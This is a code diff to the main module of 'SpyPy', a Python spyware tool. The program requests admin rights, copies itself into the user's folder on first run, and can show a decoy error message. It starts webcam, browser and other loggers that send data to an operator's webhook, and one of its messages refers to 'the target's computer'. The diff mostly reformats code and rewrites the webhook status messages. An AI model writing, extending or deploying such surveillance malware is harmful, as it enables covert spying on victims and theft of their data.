@@ -20,25 +20,19 @@ from loggers.webcam_logger import WebcamLogger
 ###############################
 # DO NOT MODIFY THESE VALUES! #
 # THEY ARE SET BY THE BUILDER #
-WEBHOOK_URL = ""              #
-SOFTWARE_EXE_NAME = ""        #
-SOFTWARE_DIR_NAME = ""        #
-CUSTOM_ERROR_MESSAGE = None   #
+WEBHOOK_URL = ""  #
+SOFTWARE_EXE_NAME = ""  #
+SOFTWARE_DIR_NAME = ""  #
+CUSTOM_ERROR_MESSAGE = None  #
 ###############################
 
 
 class SpyPy:
     def __init__(self):
         if not is_admin():
-            try:
-                ctypes.windll.shell32.ShellExecuteW(
-                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
-                )
-            except Exception as e:
-                send_webhook(
-                    WEBHOOK_URL, "FATAL ERROR: COULD NOT GET ADMIN PRIVILEGES. PLEASE TRY AGAIN OR CHECK LOGS."
-                )
-                os._exit(1)
+            ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, " ".join(sys.argv), None, 1
+            )
 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
@@ -68,7 +62,9 @@ class SpyPy:
                 ]
                 for logger_class_name in logger_class_names:
                     if globals().get(logger_class_name):
-                        self.loggers.append(globals()[logger_class_name](SOFTWARE_DIR_NAME, WEBHOOK_URL))
+                        self.loggers.append(
+                            globals()[logger_class_name](SOFTWARE_DIR_NAME, WEBHOOK_URL)
+                        )
             else:
                 self.loggers = [
                     BrowserLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
@@ -82,10 +78,11 @@ class SpyPy:
                 ]
         except Exception as e:
             send_webhook(
-                WEBHOOK_URL, "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
+                WEBHOOK_URL,
+                f"```❌ The program encountered a fatal error while initializing loggers ({e}). The program will not run properly.```",
             )
             os._exit(1)
-            
+
         self.threads = []
 
         self.setup()
@@ -106,7 +103,10 @@ class SpyPy:
         if self.is_exe:
             if not os.path.exists(self.first_run_flag):
                 try:
-                    send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...")
+                    send_webhook(
+                        WEBHOOK_URL,
+                        f"```✅ {SOFTWARE_EXE_NAME} has been executed for the first time. Setting up...```",
+                    )
                     open(self.first_run_flag, "w").close()
                     current_exe = sys.executable
                     new_exe = os.path.join(
@@ -122,14 +122,18 @@ class SpyPy:
                     os._exit(0)
                 except Exception as e:
                     send_webhook(
-                        "FATAL ERROR: COULD NOT SETUP FIRST RUN. PLEASE TRY AGAIN OR CHECK LOGS."
+                        f"```❌ The program encountered a fatal error while setting up the software on the target's computer ({e}). The program will not run properly. ```"
                     )
                     os._exit(1)
             else:
-                send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...")
+                send_webhook(
+                    WEBHOOK_URL,
+                    f"```✅ {SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...```",
+                )
                 self.start()
         else:
-            send_webhook(WEBHOOK_URL, f"SpyPy has been executed...")
+            send_webhook(WEBHOOK_URL, f"```✅ SpyPy has been executed directly...```")
+            send_webhook(WEBHOOK_URL, f"```This is for debugging purposes only. If you want to use SpyPy, please build it as an executable by running spy-py.bat.```")
             if CUSTOM_ERROR_MESSAGE:
                 display_error_message("Error", CUSTOM_ERROR_MESSAGE)
             self.start()
